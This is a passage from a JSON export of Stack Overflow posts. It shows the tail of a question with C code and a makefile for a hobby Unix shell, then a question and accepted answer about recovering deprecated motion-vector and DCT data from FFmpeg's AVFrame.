(pid &lt; 0) {\n        fprintf(stderr, \"Error from waitpid: %s\", strerror(errno));\n        return -1;\n    }\n    if (WIFSIGNALED(status)) {\n        fprintf(stderr, \"pid %ld: killed by signal %d\\n\",\n                (long) pid, WTERMSIG(status));\n\n        return -1;\n    }\n    return WEXITSTATUS(status);\n}\n\n/* The shell performs wildcard expansion on each token it extracts while parsing the command line.\n * Oftentimes, globbing will obviously not do anything (for example, ls just returns ls).\n * When you want nullglob behavior you'll have to know whether the glob function actually found any glob characters, though\n */\nstatic void expandVariable(char *shellcommand) {\n    char mystring[CMD_LEN];\n    char *cp;\n    char *ep;\n\n    strcpy(mystring, shellcommand);\n    cp = strstr(mystring, \"$(\");\n    if (cp) {\n        *cp++ = '\\0';\n        strcpy(shellcommand, mystring);\n        ep = ++cp;\n        while (*ep &amp;&amp; (*ep != ')')) ep++;\n        if (*ep == ')') *ep++ = '\\0';\n        cp = getenv(cp);\n        if (cp) strcat(shellcommand, cp);\n        strcat(shellcommand, ep);\n    }\n    return;\n}\n\nint do_help(int argc, const char **argv) {\n    const CommandEntry *entry;\n    const char *str;\n\n    str = NULL;\n\n    if (argc == 2)\n        str = argv[1];\n\n    /*\n     * Check for an exact match, in which case describe the program.\n     */\n    if (str) {\n        for (entry = commandEntryTable; entry-&gt;name; entry++) {\n            if (strcmp(str, entry-&gt;name) == 0) {\n                printf(\"%s\\n\", entry-&gt;description);\n\n                printf(\"usage: %s %s\\n\", entry-&gt;name,\n                       entry-&gt;usage);\n\n                return 0;\n            }\n        }\n    }\n\n    /*\n     * Print short information about commands which contain the\n     * specified word.\n     */\n    for (entry = commandEntryTable; entry-&gt;name; entry++) {\n        if ((str == NULL) || (strstr(entry-&gt;name, str) != NULL) ||\n            (strstr(entry-&gt;usage, str) != NULL)) {\n            printf(\"%-10s %s\\n\", entry-&gt;name, entry-&gt;usage);\n        }\n    }\n\n    return 0;\n}\n\n/*\n * Try to execute a built-in command.\n * Returns TRUE if the command is a built in, whether or not the\n * command succeeds.  Returns FALSE if this is not a built-in command.\n */\nbool exec_builtin(const char *cmd) {\n    const char *endCmd;\n    const CommandEntry *entry;\n    int argc;\n    const char **argv;\n    char cmdName[CMD_LEN];\n\n    /*\n     * Look for the end of the command name and then copy the\n     * command name to a buffer so we can null terminate it.\n     */\n    endCmd = cmd;\n\n    while (*endCmd &amp;&amp; !isBlank(*endCmd))\n        endCmd++;\n\n    memcpy(cmdName, cmd, endCmd - cmd);\n    cmdName[endCmd - cmd] = '\\0';\n\n    /*\n     * Search the command table looking for the command name.\n     */\n    for (entry = commandEntryTable; entry-&gt;name != NULL; entry++) {\n        if (strcmp(entry-&gt;name, cmdName) == 0)\n            break;\n    }\n\n    /*\n     * If the command is not a built-in, return indicating that.\n     */\n    if (entry-&gt;name == NULL) {\n        return false;\n    }\n\n    bool bo = false;\n    /*\n     * The command is a built-in.\n     * Break the command up into arguments and expand wildcards.\n     */\n    if (!makeArgs(cmd, &amp;argc, &amp;argv, bo)) {\n        return true;\n    }\n\n    /*\n     * Give a usage string if the number of arguments is too large\n     * or too small.\n     */\n    if ((argc &lt; entry-&gt;minArgs) || (argc &gt; entry-&gt;maxArgs)) {\n        fprintf(stderr, \"usage: %s %s\\n\", entry-&gt;name, entry-&gt;usage);\n        return true;\n    }\n\n    /*\n     * Call the built-in function with the argument list.\n     */\n    entry-&gt;func(argc, argv);\n    return true;\n}\n\n\n/*\n * Parse and execute one null-terminated command line string.\n * This breaks the command line up into words, checks to see if the\n * command is an alias, and expands wildcards.\n */\nint command(const char *cmd) {\n    const char *endCmd;\n    char cmdName[CMD_LEN];\n    freeChunks();\n\n    /*\n     * Skip leading blanks.\n     */\n    while (isBlank(*cmd))\n        cmd++;\n    /*\n     * If the command is empty or is a comment then ignore it.\n     */\n    if ((*cmd == '\\0') || (*cmd == '#'))\n        return 0;\n    /*\n     * Look for the end of the command name and then copy the\n     * command name to a buffer so we can null terminate it.\n     */\n    endCmd = cmd;\n    while (*endCmd &amp;&amp; !isBlank(*endCmd))\n        endCmd++;\n\n    memcpy(cmdName, cmd, endCmd - cmd);\n    cmdName[endCmd - cmd] = '\\0';\n    /*\n     * Expand simple environment variables\n     */\n    while (strstr(cmd, \"$(\")) expandVariable((char *) cmd);\n    /*\n     * Now look for the command in the builtin table, and execute\n     * the command if found.\n     */\n    if (exec_builtin(cmd)) {\n        return 0;\n    }\n    /*\n     * The command is not a built-in, so run the program along\n     * the PATH list.\n     */\n    return runCmd(cmd);\n}\n\n/*\n * Execute the specified file or program\n * A null name pointer indicates to read from stdin.\n */\n\nint exec_program(const char *name) {\n    FILE *fp;\n    int r = 0;\n    char *input, shell_prompt[100];\n    if (sourceCount &gt;= MAX_SOURCE) {\n        fprintf(stderr, \"Too many source files\\n\");\n        return 1;\n    }\n    fp = stdin;\n    if (name) {\n        fp = fopen(name, \"r\");\n\n        if (fp == NULL) {\n            perror(name);\n\n            return 1;\n        }\n    }\n    sourcefiles[sourceCount++] = fp;\n    setlocale(LC_CTYPE, \"\");\n    /*Configure readline to auto-complete paths when the tab key is hit.*/\n    rl_bind_key('\\t', rl_complete);\n    /*stifle_history(7);*/\n    for (; ;) {\n        /* Create prompt string from user name and current working directory.*/\n        snprintf(shell_prompt, sizeof(shell_prompt), \"%s:%s $ \", getenv(\"USER\"), getcwd(NULL, 1024));\n        // Display prompt and read input (NB: input must be freed after use)...\n        input = readline(shell_prompt);\n        // Check for EOF.\n        if (!input)\n            break;\n        add_history(input);\n        r = command(input);\n        free(input);\n    }\n    return r;\n}\n\nstatic struct option long_options[] = {\n        {\"with_param\", 1, 0, 'p'},\n        {\"version\",    0, 0, 'v'},\n        {\"help\",       0, 0, 'h'},\n        {0,            0, 0, 0}\n};\n\nchar s[] = \"Interrupt\\n\";\n\nvoid int_handler(int signum) {\n    if (write(fileno(stdin), s, sizeof s - 1)) { } else { }\n    if (signum) { if (false); } else { }\n}\n\nint main(int argc, char *argv[]) {\n    struct sigaction sh;\n\n    sh.sa_handler = int_handler;\n    sigemptyset(&amp;sh.sa_mask);\n    sh.sa_flags = 0;\n    sigaction(SIGINT, &amp;sh, NULL);\n\n    sourceCount = 0;\n    const char *commandFile;\n    commandFile = NULL;\n    char *pathValue;\n    int option;\n    sh.sa_handler = int_handler;\n    sigemptyset(&amp;sh.sa_mask);\n    sh.sa_flags = 0;\n    sigaction(SIGINT, &amp;sh, NULL);\n    int option_index = 0;\n    while (1) {\n        option_index = 0;\n        option = getopt_long(argc, argv, \"p:vh\",\n                             long_options, &amp;option_index);\n        if (option == -1)\n            break;\n        switch (option) {\n            case 'p': {\n                /* store_parameter(optarg); */\n                break;\n            }\n            case 'v': {\n                printf(\"OpenShell version 0.1(a)\\n\");\n                printf(\"Version: %s\\n\", VERSION);\n                exit(EXIT_SUCCESS);\n\n            }\n            case 'h': {\n                printf(\"Usage: ./shell\\n\");\n                /*print_help();*/\n                exit(EXIT_SUCCESS);\n\n            }\n            default: {\n                /*                fprintf(stderr, \"Error (%s): unrecognized option.\\n\", __FUNCTION__);*/\n                /* print_help();*/\n                return 1;/*RETURN_FAILURE;*/\n\n            }\n        } /* end switch */\n    }\n    /* get the PATH environment to find if less is installed */\n    pathValue = getenv(\"PATH\");\n    if (!pathValue || getenv(\"PATH\") == NULL) {\n        printf(\"'%s' is not set.\\n\", \"PATH\");\n        /* Default our path if it is not set. */\n        putenv(\"PATH=/bin:/usr/bin:/sbin:/usr/sbin:/etc\");\n    }\n    else {\n        printf(\"'%s' is set to %s.\\n\", \"PATH\", pathValue);\n    }\n    exec_program(commandFile);\n    return (0);\n}\n</code></pre>\n\n<p>My makefile:</p>\n\n<pre><code>CC = gcc\nGIT_VERSION := $(shell git describe --abbrev=4 --dirty --always --tags)\nCFLAGS := $(CFLAGS) -L/usr/local/include/ -L/usr/include -pedantic -std=c99 -Wall -O3 -g -DVERSION=\\\"$(GIT_VERSION)\\\" -ledit -lncurses\n\nLDIRS = -L/usr/local/lib -L/usr/lib\nLIBS =su -lcurses\n\nshell: main.o\n    $(CC) -o shell main.o errors.c util.c pipeline.c -ledit -lncurses -lcurses\n\nmain.o: main.c errors.c util.c\nUSERNAME := $(shell whoami &gt;&gt; username.txt)\nGIT:= $(shell head -n -1 openshell.h &gt; temp.txt ; mv temp.txt openshell.h;git describe --abbrev=4 --dirty --always --tags &gt; VERSION; echo \"\\#define VERSION \\\"$(GIT_VERSION)\\\"\" &gt;&gt; openshell.h)\n\n.PHONY: clean\nclean:\n    rm -f *.o\n</code></pre>\n"}, {"tags": ["c", "ffmpeg"], "answers": [{"comments": [{"owner": {"reputation": 343, "user_id": 5234910, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/8946773a752c194d19cfc1e2217b6612?s=128&d=identicon&r=PG&f=1", "display_name": "Kindermann", "link": "https://stackoverflow.com/users/5234910/kindermann"}, "edited": false, "score": 0, "creation_date": 1461768068, "post_id": 36888061, "comment_id": 61350454, "body": "hi, your guess was correct: i want to analyze a stream by comparing it to another stream. The two streams should come from two different devices, which means they are (supposed to be) encoded differently. Even though they are encoded using the same coding format (e.g H264 codec). I want to examine what exactly those differences are. I think motion vector and DCT Coefficient are two areas where those differences may reside. But unfortunately, and i don&#39;t quite understand why FFmpeg developers have made that piece of information deprecated..."}, {"owner": {"reputation": 9546, "user_id": 4726410, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-01-VKaG7APo/AAAAAAAAAAI/AAAAAAAAE9w/c0cx5Eqf08s/photo.jpg?sz=128", "display_name": "Ronald S. Bultje", "link": "https://stackoverflow.com/users/4726410/ronald-s-bultje"}, "reply_to_user": {"reputation": 343, "user_id": 5234910, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/8946773a752c194d19cfc1e2217b6612?s=128&d=identicon&r=PG&f=1", "display_name": "Kindermann", "link": "https://stackoverflow.com/users/5234910/kindermann"}, "edited": false, "score": 0, "creation_date": 1461788610, "post_id": 36888061, "comment_id": 61364489, "body": "I would recommend using a stream analyzer. I understand these things aren&#39;t always free, but neither is your time..."}, {"owner": {"reputation": 9546, "user_id": 4726410, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-01-VKaG7APo/AAAAAAAAAAI/AAAAAAAAE9w/c0cx5Eqf08s/photo.jpg?sz=128", "display_name": "Ronald S. Bultje", "link": "https://stackoverflow.com/users/4726410/ronald-s-bultje"}, "reply_to_user": {"reputation": 343, "user_id": 5234910, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/8946773a752c194d19cfc1e2217b6612?s=128&d=identicon&r=PG&f=1", "display_name": "Kindermann", "link": "https://stackoverflow.com/users/5234910/kindermann"}, "edited": false, "score": 1, "creation_date": 1461839841, "post_id": 36888061, "comment_id": 61386481, "body": "Then you&#39;ll unfortunately have to patch ffmpeg (or use an older version)... Again, I think they&#39;re happy to have this functionality, the API should just be much more generic, so with that changed, they&#39;d probably accept a patch reintroducing this functionality (or reverting its removal)."}, {"owner": {"reputation": 343, "user_id": 5234910, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/8946773a752c194d19cfc1e2217b6612?s=128&d=identicon&r=PG&f=1", "display_name": "Kindermann", "link": "https://stackoverflow.com/users/5234910/kindermann"}, "edited": false, "score": 0, "creation_date": 1461841011, "post_id": 36888061, "comment_id": 61387289, "body": "Yes the only way I can think of right now to get those deprecated yet important attributes is to look into ffmpeg library and insert some printf methods at right places inside the library. But that will cost me very much effort...btw, in AVFrame-&gt;side_data struct, i did find motion_vector. Thank you"}], "tags": [], "owner": {"reputation": 9546, "user_id": 4726410, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-01-VKaG7APo/AAAAAAAAAAI/AAAAAAAAE9w/c0cx5Eqf08s/photo.jpg?sz=128", "display_name": "Ronald S. Bultje", "link": "https://stackoverflow.com/users/4726410/ronald-s-bultje"}, "is_accepted": true, "score": 0, "last_activity_date": 1461755413, "creation_date": 1461755413, "answer_id": 36888061, "question_id": 36883792, "link": "https://stackoverflow.com/questions/36883792/avframe-deprecated-attributes-to-regain/36888061#36888061", "title": "AVFrame deprecated attributes to regain?", "body": "<p>See <a href=\"https://www.ffmpeg.org/doxygen/trunk/group__lavu__frame.html#gadec0efb470b1eead6a979333d9deca0c\" rel=\"nofollow\"><code>av_frame_get_side_data</code></a><code>(frame,</code><a href=\"https://www.ffmpeg.org/doxygen/trunk/group__lavu__frame.html#ggae01fa7e427274293aacdf2adc17076bcaf50d0ed0a9a4517341c221be03a06c42\" rel=\"nofollow\"><code>AV_FRAME_DATA_MOTION_VECTORS</code></a><code>)</code> for the motion vectors. The other two have no replacement. The documentation states that they're mpeg-specific and using internal implementation details, which is why no replacement was provided.</p>\n\n<p>(Don't forget to set <code>avctx-&gt;</code><a href=\"https://ffmpeg.org/doxygen/trunk/structAVCodecContext.html#a1944f9a4f8f2e123c087e1fe7613d571\" rel=\"nofollow\"><code>flags2</code></a> <code>&amp;</code> <a href=\"https://ffmpeg.org/doxygen/trunk/group__lavc__core.html#ga33ff0b9183c222b2c509f34d1516969f\" rel=\"nofollow\"><code>AV_CODEC_FLAG2_EXPORT_MVS</code></a>, otherwise it's not exported.)</p>\n\n<p>For the two with no replacement, I understand you might want that type of information if you're e.g. writing a stream analyzer, but FFmpeg really doesn't provide a stream-analyzer-level API right now. They could - if there's a more generic API - obviously be added as a separate side-data type. If you want that, you should probably become a FFmpeg developer and work on a broader API that is not MPEG-specific (e.g. does not use internal macros for mb_type), possibly even implement it for other codecs. In any other case, I don't really see why you would want that information. Can you elaborate?</p>\n"}], "owner": {"reputation": 343, "user_id": 5234910, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/8946773a752c194d19cfc1e2217b6612?s=128&d=identicon&r=PG&f=1", "display_name": "Kindermann", "link": "https://stackoverflow.com/users/5234910/kindermann"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 240, "favorite_count": 0, "accepted_answer_id": 36888061, "answer_count": 1, "score": 2, "last_activity_date": 1461755413, "creation_date": 1461744047, "question_id": 36883792, "link": "https://stackoverflow.com/questions/36883792/avframe-deprecated-attributes-to-regain", "title": "AVFrame deprecated attributes to regain?", "body": "<p>I want to print out some attributes of video frames: I've looked into AVFrame struct, but only found the following disappointments:</p>\n\n<pre><code>attribute_deprecated short *    dct_coeff\nattribute_deprecated uint32_t *     mb_type\n</code></pre>\n\n<p>It seems to me everything I am interested in is already obsolete. Btw, I didn't find </p>\n\n<pre><code>int16_t(*[2]    motion_val )[2]\n</code></pre>\n\n<p>attribute in the actual frame I captured. My question is: how can i get access to those attributes such as dct_coeff or motion_vector or mb_type of a frame at all?</p>\n"}]